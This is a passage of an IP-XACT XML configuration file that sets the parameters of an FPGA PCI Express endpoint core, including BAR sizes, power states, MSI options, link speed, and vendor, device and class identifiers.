        <spirit:configurableElementValue spirit:referenceId="MODELPARAM_VALUE.dis_scl_fctr_d2_state">0</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="MODELPARAM_VALUE.dis_scl_fctr_d3_state">0</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="MODELPARAM_VALUE.dsi">0</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="MODELPARAM_VALUE.ep_l0s_accpt_lat">000</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="MODELPARAM_VALUE.ep_l1_accpt_lat">111</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="MODELPARAM_VALUE.ext_tag_fld_sup">FALSE</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="MODELPARAM_VALUE.int_pin">1</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="MODELPARAM_VALUE.intx">TRUE</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="MODELPARAM_VALUE.max_lnk_spd">1</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="MODELPARAM_VALUE.max_lnk_wdt">000001</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="MODELPARAM_VALUE.mps">001</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="MODELPARAM_VALUE.no_soft_rst">TRUE</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="MODELPARAM_VALUE.pci_exp_int_freq">2</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="MODELPARAM_VALUE.pci_exp_ref_freq">0</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="MODELPARAM_VALUE.phantm_func_sup">00</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="MODELPARAM_VALUE.pme_sup">0F</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="MODELPARAM_VALUE.pwr_con_d0_state">00</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="MODELPARAM_VALUE.pwr_con_d1_state">00</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="MODELPARAM_VALUE.pwr_con_d2_state">00</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="MODELPARAM_VALUE.pwr_con_d3_state">00</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="MODELPARAM_VALUE.pwr_dis_d0_state">00</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="MODELPARAM_VALUE.pwr_dis_d1_state">00</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="MODELPARAM_VALUE.pwr_dis_d2_state">00</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="MODELPARAM_VALUE.pwr_dis_d3_state">00</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="MODELPARAM_VALUE.rev_id">00</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="MODELPARAM_VALUE.slot_clk">TRUE</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="MODELPARAM_VALUE.subsys_id">0007</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="MODELPARAM_VALUE.subsys_ven_id">10EE</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="MODELPARAM_VALUE.ven_id">10EE</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="MODELPARAM_VALUE.xrom_bar">00000000</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.ACK_NAK_Timeout_Func">Absolute</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.ACK_NAK_Timeout_Value">0000</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.AER_ACS_Violation">false</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.AER_AtomicOp_Egress_Blocked">false</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.AER_Completer_Abort">false</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.AER_Completion_Timeout">false</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.AER_Correctable_Internal_Error">false</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.AER_ECRC_Check_Capable">false</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.AER_ECRC_Error">false</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.AER_ECRC_Gen_Capable">false</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.AER_Enabled">false</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.AER_Flow_Control_Protocol_Error">false</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.AER_Header_Log_Overflow">false</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.AER_MC_Blocked_TLP">false</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.AER_Multiheader">false</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.AER_Permit_Root_Error_Update">false</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.AER_Receiver_Error">false</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.AER_Receiver_Overflow">false</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.AER_Surprise_Down">false</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.AER_TLP_Prefix_Blocked">false</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.AER_Uncorrectable_Internal_Error">false</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.ARI_Forwarding_Supported">false</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.ASPM_Optionality">false</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.ATOMICOP32_Completer_Supported">false</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.ATOMICOP64_Completer_Supported">false</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.Acceptable_L0s_Latency">Maximum_of_64_ns</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.Acceptable_L1_Latency">No_limit</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.AtomicOp_Routing_Supported">false</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.BAR0_Size_Vector">1M</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.BAR1_Size_Vector">1M</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.BAR2_Size_Vector">1M</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.BAR3_Size_Vector">1M</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.BAR4_Size_Vector">1M</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.BAR5_Size_Vector">1M</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.BAR_Index_Value0">0</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.BAR_Index_Value1">0</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.BAR_Index_Value2">0</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.BAR_Index_Value3">0</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.BAR_Index_Value4">0</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.BAR_Index_Value5">0</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.Bar0_64bit">false</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.Bar0_Enabled">true</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.Bar0_Prefetchable">false</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.Bar0_Scale">Kilobytes</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.Bar0_Size">2</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.Bar0_Type">Memory</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.Bar1_64bit">false</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.Bar1_Enabled">false</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.Bar1_Prefetchable">false</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.Bar1_Scale">Kilobytes</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.Bar1_Size">2</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.Bar1_Type">N/A</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.Bar2_64bit">false</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.Bar2_Enabled">false</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.Bar2_Prefetchable">false</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.Bar2_Scale">Kilobytes</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.Bar2_Size">2</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.Bar2_Type">N/A</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.Bar3_64bit">false</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.Bar3_Enabled">false</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.Bar3_Prefetchable">false</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.Bar3_Scale">Kilobytes</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.Bar3_Size">2</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.Bar3_Type">N/A</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.Bar4_64bit">false</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.Bar4_Enabled">false</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.Bar4_Prefetchable">false</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.Bar4_Scale">Kilobytes</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.Bar4_Size">2</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.Bar4_Type">N/A</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.Bar5_Enabled">false</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.Bar5_Prefetchable">false</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.Bar5_Scale">Kilobytes</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.Bar5_Size">2</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.Bar5_Type">N/A</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.Base_Class_Menu">Network_controller</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.Buf_Opt_BMA">false</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.CAS128_Completer_Supported">false</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.Cardbus_CIS_Pointer">00000000</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.Class_Code_Base">02</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.Class_Code_Interface">00</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.Class_Code_Sub">00</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.Component_Name">pcie_7x_0</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.Cost_Table">1</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.Cpl_Finite">false</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.Cpl_Timeout_Disable_Sup">false</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.Cpl_Timeout_Range">Range_B</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.D0_PME_Support">true</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.D0_Power_Consumed">0</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.D0_Power_Consumed_Factor">0</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.D0_Power_Dissipated">0</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.D0_Power_Dissipated_Factor">0</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.D1_PME_Support">true</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.D1_Power_Consumed">0</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.D1_Power_Consumed_Factor">0</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.D1_Power_Dissipated">0</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.D1_Power_Dissipated_Factor">0</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.D1_Support">false</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.D2_PME_Support">true</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.D2_Power_Consumed">0</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.D2_Power_Consumed_Factor">0</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.D2_Power_Dissipated">0</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.D2_Power_Dissipated_Factor">0</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.D2_Support">false</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.D3_Power_Consumed">0</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.D3_Power_Consumed_Factor">0</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.D3_Power_Dissipated">0</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.D3_Power_Dissipated_Factor">0</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.D3cold_PME_Support">false</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.D3hot_PME_Support">true</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.DSN_Enabled">true</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.De_emph">-3.5</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.Device_ID">1337</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.Device_Port_Type">PCI_Express_Endpoint_device</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.Device_Specific_Initialization">false</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.Disable_Rx_Poisoned_Resp">false</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.Disable_Tx_ASPM_L0s">false</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.Dll_Link_Active_Cap">false</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.Downstream_Link_Num">00</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.EXT_PCI_CFG_Space">false</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.EXT_PCI_CFG_Space_Addr">3FF</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.En_route_err_cor">false</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.En_route_err_ftl">false</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.En_route_err_nfl">false</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.En_route_inta">false</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.En_route_intb">false</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.En_route_intc">false</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.En_route_intd">false</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.En_route_pm_pme">false</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.En_route_pme_to">false</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.En_route_pme_to_ack">false</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.En_route_unlock">false</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.Enable_ACK_NAK_Timer">false</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.Enable_Lane_Reversal">false</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.Enable_Replay_Timer">false</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.Enable_Slot_Clock_Cfg">true</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.Expansion_Rom_Enabled">false</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.Expansion_Rom_Scale">Kilobytes</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.Expansion_Rom_Size">2</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.Extended_Tag_Default">false</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.Extended_Tag_Field">false</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.Force_No_Scrambling">false</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.Hw_Auton_Spd_Disable">false</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.IO_Base_Limit_Registers">Disabled</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.IntX_Generation">true</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.Interface_Width">64_bit</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.Legacy_Interrupt">INTA</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.Link_Speed">2.5_GT/s</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.MSI_64b">true</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.MSI_Enabled">true</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.MSI_Vec_Mask">false</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.MSIx_Enabled">false</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.MSIx_PBA_BIR">BAR_0</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.MSIx_PBA_Offset">0</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.MSIx_Table_BIR">BAR_0</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.MSIx_Table_Offset">0</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.MSIx_Table_Size">1</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.Max_Payload_Size">256_bytes</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.Maximum_Link_Width">X1</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.Multiple_Message_Capable">1_vector</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.No_Soft_Reset">true</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.Optional_Error_Support">000000</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.PCI_CFG_Space">true</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.PCI_CFG_Space_Addr">3E</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.PCIe_Blk_Locn">X0Y0</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.PCIe_Cap_Slot_Implemented">false</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.PCIe_Debug_Ports">true</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.Pcie_fast_config">None</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.Perf_Level">Good</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.Phantom_Functions">No_function_number_bits_used</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.Prefetchable_Memory_Base_Limit_Registers">Disabled</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.RBAR_Enabled">false</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.RBAR_Initial_Value0">0</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.RBAR_Initial_Value1">0</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.RBAR_Initial_Value2">0</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.RBAR_Initial_Value3">0</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.RBAR_Initial_Value4">0</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.RBAR_Initial_Value5">0</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.RBAR_Num">0</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.RCB">64_byte</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.RECRC_Check">0</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.RECRC_Check_Trim">false</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.RESET_BOARD_INTERFACE">Custom</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.Receive_NP_Request">true</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.Ref_Clk_Freq">100_MHz</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.Replay_Timeout_Func">Add</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.Replay_Timeout_Value">0000</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.Revision_ID">00</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.Root_Cap_CRS">false</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.Silicon_Rev">GES_and_Production</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.Slot_Cap_Attn_Butn">false</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.Slot_Cap_Attn_Ind">false</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.Slot_Cap_Elec_Interlock">false</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.Slot_Cap_HotPlug_Cap">false</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.Slot_Cap_HotPlug_Surprise">false</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.Slot_Cap_MRL">false</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.Slot_Cap_No_Cmd_Comp_Sup">false</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.Slot_Cap_Physical_Slot_Num">0</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.Slot_Cap_Pwr_Ctrl">false</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.Slot_Cap_Pwr_Ind">false</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.Slot_Cap_Pwr_Limit_Scale">0</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.Slot_Cap_Pwr_Limit_Value">0</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.Sub_Class_Interface_Menu">Ethernet_controller</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.Subsystem_ID">0007</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.Subsystem_Vendor_ID">10EE</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.TPH_Completer_Supported">00</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.Trans_Buf_Pipeline">None</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.Trgt_Link_Speed">4&apos;h1</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.UR_Atomic">false</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.UR_INV_REQ">true</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.UR_PRS_RESPONSE">true</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.USE_BOARD_FLOW">false</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.Upconfigure_Capable">true</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.Use_Class_Code_Lookup_Assistant">false</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.User_Clk_Freq">125</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.VC_Cap_Enabled">false</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.VC_Cap_Reject_Snoop">false</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.VSEC_Enabled">false</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.Vendor_ID">10EE</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.Xlnx_Ref_Board">None</spirit:configurableElementValue>
        <spirit:configurableElementValue spirit:referenceId="PARAM_VALUE.cfg_ctl_if">true</spirit:configurableElementValue>
